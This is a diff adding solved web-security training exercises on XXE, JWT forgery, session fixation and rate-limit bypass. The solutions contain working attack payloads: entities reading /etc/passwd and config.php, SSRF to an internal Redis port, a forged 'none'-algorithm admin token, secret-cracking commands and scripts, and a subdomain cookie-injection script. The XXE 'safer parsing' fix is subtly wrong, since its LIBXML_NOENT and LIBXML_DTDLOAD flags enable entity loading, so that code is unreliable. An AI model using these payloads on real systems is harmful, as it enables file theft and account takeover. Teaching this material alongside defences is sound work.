@@ -796,6 +796,366 @@ def fetch():
 
 ---
 
+## 🔀 XXE Exercises
+
+### Exercise 13: XML External Entity (Medium)
+**Objective**: Exploit XXE to read local files.
+
+**Scenario**: An XML API endpoint:
+```php
+$xml = simplexml_load_string($_POST['xml']);
+echo "Hello " . $xml->name;
+```
+
+**Challenge**: Read `/etc/passwd` using XXE.
+
+**Hints**:
+<details>
+<summary>Click for Hint 1</summary>
+Define an external entity in the DOCTYPE
+</details>
+
+<details>
+<summary>Click for Solution</summary>
+
+**Basic XXE payload**:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+**Read PHP files (with base64 encoding to avoid parse errors)**:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
+]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+**SSRF via XXE**:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://localhost:6379/INFO">
+]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+**Prevention**:
+```php
+// Disable external entities
+libxml_disable_entity_loader(true);
+$xml = simplexml_load_string($_POST['xml']);
+
+// Or use safer parsing
+$dom = new DOMDocument();
+$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
+```
+</details>
+
+---
+
+## 🔐 Advanced Authentication Exercises
+
+### Exercise 14: JWT Token Manipulation (Hard)
+**Objective**: Exploit JWT vulnerabilities.
+
+**Scenario**: Application uses JWT for authentication:
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature
+```
+
+**Challenges**:
+1. Change role from "user" to "admin"
+2. Exploit "none" algorithm
+3. Crack weak secret
+
+**Hints**:
+<details>
+<summary>Click for Hint 1</summary>
+JWT has three parts: header.payload.signature
+</details>
+
+<details>
+<summary>Click for Hint 2</summary>
+Try changing the algorithm to "none"
+</details>
+
+<details>
+<summary>Click for Solution</summary>
+
+**Decode JWT**:
+```bash
+# Header (base64 decode)
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+# {"alg":"HS256","typ":"JWT"}
+
+# Payload
+echo "eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0" | base64 -d
+# {"user":"john","role":"user"}
+```
+
+**Attack 1: Algorithm Confusion (none)**:
+```json
+// New header
+{"alg":"none","typ":"JWT"}
+// Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+// New payload
+{"user":"john","role":"admin"}
+// Base64: eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9
+
+// Final JWT (no signature)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9.
+```
+
+**Attack 2: Weak Secret Brute Force**:
+```bash
+# Using hashcat
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+# Using john
+john jwt.txt --wordlist=rockyou.txt
+
+# Python script
+import jwt
+
+token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature"
+wordlist = open('wordlist.txt', 'r')
+
+for secret in wordlist:
+    secret = secret.strip()
+    try:
+        decoded = jwt.decode(token, secret, algorithms=['HS256'])
+        print(f"Secret found: {secret}")
+        break
+    except jwt.InvalidSignatureError:
+        pass
+```
+
+**Attack 3: Algorithm Confusion (RS256 to HS256)**:
+```python
+# If server uses RSA public key, try forcing HMAC with the public key
+import jwt
+
+# Get public key from server
+public_key = open('public.pem', 'r').read()
+
+payload = {"user": "john", "role": "admin"}
+token = jwt.encode(payload, public_key, algorithm='HS256')
+```
+
+**Prevention**:
+```python
+import jwt
+
+# Always specify algorithm
+try:
+    decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
+except jwt.InvalidTokenError:
+    abort(401)
+
+# Use strong secrets
+SECRET_KEY = os.urandom(32)
+
+# Better: Use RS256 with proper key management
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+token = jwt.encode(payload, private_key, algorithm='RS256')
+```
+</details>
+
+---
+
+### Exercise 15: Session Fixation (Medium)
+**Objective**: Fix a user's session ID before they log in.
+
+**Scenario**: Application doesn't regenerate session on login:
+```php
+session_start();
+if (login($_POST['username'], $_POST['password'])) {
+    $_SESSION['user'] = $_POST['username'];
+}
+```
+
+**Challenge**: Make victim use your session ID.
+
+**Hints**:
+<details>
+<summary>Click for Hint 1</summary>
+Set the victim's session cookie before they log in
+</details>
+
+<details>
+<summary>Click for Solution</summary>
+
+**Attack Steps**:
+1. Get a valid session ID from the application
+2. Send victim a link with that session ID
+3. When victim logs in, you share their session
+
+**Method 1: URL Parameter**:
+```
+http://example.com/login?PHPSESSID=attacker_session_id
+```
+
+**Method 2: Cookie Injection (if subdomain)**:
+```html
+<!-- From attacker.example.com -->
+<script>
+document.cookie = "PHPSESSID=attacker_session_id; domain=.example.com";
+window.location = "http://example.com/login";
+</script>
+```
+
+**Method 3: XSS**:
+```html
+<script>
+document.cookie = "PHPSESSID=attacker_session_id";
+</script>
+```
+
+**Prevention**:
+```php
+session_start();
+
+if (login($_POST['username'], $_POST['password'])) {
+    // Regenerate session ID after login
+    session_regenerate_id(true);
+    $_SESSION['user'] = $_POST['username'];
+    
+    // Also store initial IP and user agent
+    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
+    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+}
+
+// Validate session on each request
+if (isset($_SESSION['ip']) && $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
+    session_destroy();
+    die('Session hijacking detected');
+}
+```
+</details>
+
+---
+
+## 🌐 API Security Exercises
+
+### Exercise 16: API Rate Limiting Bypass (Medium)
+**Objective**: Bypass rate limiting on an API endpoint.
+
+**Scenario**: API has rate limit of 10 requests per minute per IP.
+
+**Challenge**: Make 100 requests in one minute.
+
+**Hints**:
+<details>
+<summary>Click for Hint 1</summary>
+Try using different headers like X-Forwarded-For
+</details>
+
+<details>
+<summary>Click for Solution</summary>
+
+**Method 1: IP Spoofing Headers**:
+```bash
+for i in {1..100}; do
+    curl -H "X-Forwarded-For: 1.2.3.$i" http://api.example.com/endpoint
+done
+```
+
+**Common headers to try**:
+```
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 1.2.3.4
+X-Originating-IP: 1.2.3.4
+X-Remote-IP: 1.2.3.4
+X-Client-IP: 1.2.3.4
+```
+
+**Method 2: Multiple User-Agents**:
+```python
+import requests
+
+user_agents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+    'Mozilla/5.0 (X11; Linux x86_64)',
+]
+
+for i in range(100):
+    ua = user_agents[i % len(user_agents)]
+    requests.get('http://api.example.com/endpoint', 
+                 headers={'User-Agent': ua})
+```
+
+**Method 3: Different API Endpoints**:
+```bash
+# If rate limit is per endpoint
+curl http://api.example.com/v1/data
+curl http://api.example.com/v2/data  # Different rate limit
+```
+
+**Prevention**:
+```python
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+# Don't trust client headers
+limiter = Limiter(
+    app,
+    key_func=get_remote_address,  # Use actual IP
+    default_limits=["10 per minute"]
+)
+
+# Or implement custom logic
+from functools import wraps
+import redis
+
+redis_client = redis.Redis()
+
+def rate_limit(max_requests=10, window=60):
+    def decorator(f):
+        @wraps(f)
+        def wrapped(*args, **kwargs):
+            # Use actual connection IP, not headers
+            ip = request.environ.get('REMOTE_ADDR')
+            key = f"rate_limit:{ip}:{f.__name__}"
+            
+            current = redis_client.get(key)
+            if current and int(current) >= max_requests:
+                abort(429, "Rate limit exceeded")
+            
+            pipe = redis_client.pipeline()
+            pipe.incr(key)
+            pipe.expire(key, window)
+            pipe.execute()
+            
+            return f(*args, **kwargs)
+        return wrapped
+    return decorator
+
+@app.route('/api/data')
+@rate_limit(max_requests=10, window=60)
+def api_data():
+    return jsonify({"data": "value"})
+```
+</details>
+
+---
+
 ## 🎯 Additional Practice Resources
 
 ### Beginner Level
